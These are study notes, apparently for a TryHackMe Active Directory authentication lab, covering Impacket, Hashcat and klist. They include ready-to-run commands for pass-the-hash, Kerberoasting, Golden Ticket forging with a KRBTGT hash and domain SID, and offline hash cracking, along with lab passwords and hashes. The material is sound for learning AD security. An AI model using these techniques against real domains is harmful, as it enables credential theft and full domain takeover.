# 🛠️ Active Directory Authentication — Tools

> **Module:** Intro to AD Authentication  
> **Purpose:** Central reference for tools used throughout this module.

---

# 📖 Overview

This file collects the tools used in the Active Directory authentication notes.

The tools are grouped by their purpose so they can be quickly reviewed during revision.

---

# 🧰 Tool Summary

| Tool | Category | Main Purpose |
|---|---|---|
| **Impacket** | Active Directory / Network | Python-based collection of tools for interacting with Windows and AD protocols |
| `smbclient.py` | Impacket / SMB | Connect to SMB services using password, NTLM hash, or Kerberos authentication |
| `getTGT.py` | Impacket / Kerberos | Request a Kerberos Ticket Granting Ticket (TGT) |
| `GetUserSPNs.py` | Impacket / Kerberos | Identify/request service tickets associated with SPNs; used in Kerberoasting demonstrations |
| `ticketer.py` | Impacket / Kerberos | Create forged Kerberos tickets in the Golden Ticket demonstration |
| **Hashcat** | Password Cracking | Crack password hashes and Kerberos service-ticket hashes offline |
| `klist` | Kerberos | Display Kerberos tickets stored in the current credential cache |

---

# 1️⃣ Impacket

## 📖 What Is It?

**Impacket** is a collection of Python classes and tools for interacting with network protocols commonly encountered in Windows and Active Directory environments.

The TryHackMe room uses several Impacket examples during its practical demonstrations.

---

## 🎯 Used For

In this module, Impacket is used for:

- SMB authentication
- NTLM authentication
- Pass-the-Hash
- Kerberos authentication
- Requesting TGTs
- Kerberoasting demonstrations
- Golden Ticket demonstrations
- Using Kerberos credential caches

---

## 🧩 Important Impacket Tools Used Here

```text
smbclient.py
getTGT.py
GetUserSPNs.py
ticketer.py
```

---

# 2️⃣ smbclient.py

## 📖 Purpose

`smbclient.py` is an Impacket tool used to interact with SMB services.

It can be used in the lab to demonstrate:

- NTLM authentication
- Pass-the-Hash
- Kerberos authentication
- Access to SMB shares

---

## 🔐 NTLM Authentication Example

```bash
smbclient.py thm.loc/claire:'Password123!'@192.168.11.51
```

---

## 🔑 Pass-the-Hash Example

```bash
smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
```

---

## 🎫 Kerberos Authentication Example

```bash
smbclient.py thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

### Important Options

| Option | Purpose |
|---|---|
| `-k` | Use Kerberos authentication |
| `-no-pass` | Authenticate using the existing ticket instead of a password |
| `-dc-ip` | Specify the Domain Controller / KDC IP address |
| `-hashes` | Supply LM and NTLM hashes for hash-based authentication |

> When using Kerberos, the TryHackMe lab uses the hostname rather than the IP address because Kerberos relies on SPNs tied to DNS names.

---

# 3️⃣ getTGT.py

## 📖 Purpose

`getTGT.py` is an Impacket tool used to request a **Kerberos Ticket Granting Ticket (TGT)**.

---

## 💻 TryHackMe Example

```bash
getTGT.py thm.loc/mary:'SuperLongForKerberos123!' -dc-ip 192.168.11.100
```

The tool saves the ticket as:

```text
mary.ccache
```

---

## 🔄 Workflow

```text
Credentials
     ↓
getTGT.py
     ↓
TGT
     ↓
mary.ccache
     ↓
KRB5CCNAME
     ↓
Kerberos Authentication
```

---

# 4️⃣ GetUserSPNs.py

## 📖 Purpose

`GetUserSPNs.py` is an Impacket tool used to identify accounts associated with **Service Principal Names (SPNs)** and request service tickets.

It is used in the module's **Kerberoasting** demonstration.

---

## 💻 TryHackMe Example

```bash
GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request
```

The resulting service-ticket material can then be saved and subjected to offline password cracking.

---

## 🔄 Kerberoasting Workflow

```text
Authenticated User
        ↓
GetUserSPNs.py
        ↓
Identify SPNs
        ↓
Request Service Ticket
        ↓
Extract Ticket
        ↓
Hashcat
        ↓
Attempt Password Recovery
```

---

# 5️⃣ ticketer.py

## 📖 Purpose

`ticketer.py` is an Impacket tool used in the module's **Golden Ticket** demonstration.

It can create forged Kerberos tickets when the required Kerberos secret material is available.

---

## 💻 TryHackMe Example

```bash
ticketer.py -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
```

The lab demonstration creates:

```text
Administrator.ccache
```

---

## 🔄 Golden Ticket Workflow

```text
KRBTGT Hash
     ↓
ticketer.py
     ↓
Forged Ticket
     ↓
Administrator.ccache
     ↓
KRB5CCNAME
     ↓
smbclient.py
     ↓
Kerberos Authentication
```

> This command is retained because it is part of the TryHackMe lab material and is intended for the controlled lab environment.

---

# 6️⃣ Hashcat

## 📖 Purpose

**Hashcat** is a password recovery / cracking tool.

In this module it is used for offline cracking demonstrations.

---

## 🔓 NTLM Hashes

Hashcat mode:

```text
1000
```

Example:

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

To display recovered results:

```bash
hashcat -m 1000 hash.txt --show
```

---

## 🎫 Kerberos TGS-REP

Hashcat mode:

```text
13100
```

Example:

```bash
hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt
```

---

## 🔄 Cracking Workflow

```text
Authentication Material
        ↓
Extract Hash / Ticket
        ↓
Save to File
        ↓
Hashcat
        ↓
Password Candidate Testing
        ↓
Recovered Credential
```

---

# 7️⃣ klist

## 📖 Purpose

`klist` is a Kerberos utility used to display tickets stored in the current credential cache.

---

## 💻 Example

```bash
klist
```

It can be used to inspect the Kerberos tickets available to the current session.

---

# 📁 Kerberos Credential Cache

Kerberos tickets on Linux systems can be stored in credential cache files, commonly called:

```text
ccache
```

A default location discussed in the module is:

```text
/tmp/krb5cc_%{uid}
```

For example:

```text
/tmp/krb5cc_1000
```

---

# 🌐 KRB5CCNAME

`KRB5CCNAME` is an environment variable used to specify which Kerberos credential cache should be used.

Example:

```bash
export KRB5CCNAME=mary.ccache
```

Another example:

```bash
export KRB5CCNAME=Administrator.ccache
```

---

# 🔄 Kerberos Tool Workflow

The complete practical workflow demonstrated in the module is:

```text
getTGT.py
     ↓
TGT
     ↓
ccache
     ↓
KRB5CCNAME
     ↓
smbclient.py -k -no-pass
     ↓
TGS Request
     ↓
Service Ticket
     ↓
SMB Service
```

---

# 📊 Tool-to-Topic Mapping

| Topic | Tool |
|---|---|
| NTLM Authentication | `smbclient.py` |
| Pass-the-Hash | `smbclient.py` |
| Kerberos Authentication | `getTGT.py`, `smbclient.py`, `klist` |
| Credential Cache | `klist`, `KRB5CCNAME` |
| Kerberoasting | `GetUserSPNs.py`, Hashcat |
| NTLM Hash Cracking | Hashcat |
| Golden Ticket | `ticketer.py`, `smbclient.py` |
| SMB Access | `smbclient.py` |

---

# 🧠 Quick Revision

```text
Impacket
│
├── smbclient.py
│   ├── NTLM
│   ├── Pass-the-Hash
│   └── Kerberos
│
├── getTGT.py
│   └── Request TGT
│
├── GetUserSPNs.py
│   └── Kerberoasting
│
└── ticketer.py
    └── Golden Ticket

Hashcat
├── NTLM cracking
└── Kerberos TGS-REP cracking

klist
└── View Kerberos tickets
```

---

# 📌 Important Lab Reminder

The commands, usernames, passwords, hashes, domain names, SIDs, and IP addresses shown in this file are **TryHackMe lab examples**.

They are preserved because they are useful for learning and revision.

Do not assume these values apply to another environment.

---

# 📚 References

- TryHackMe — Intro to AD Authentication
- Impacket tools used in the TryHackMe practical demonstrations
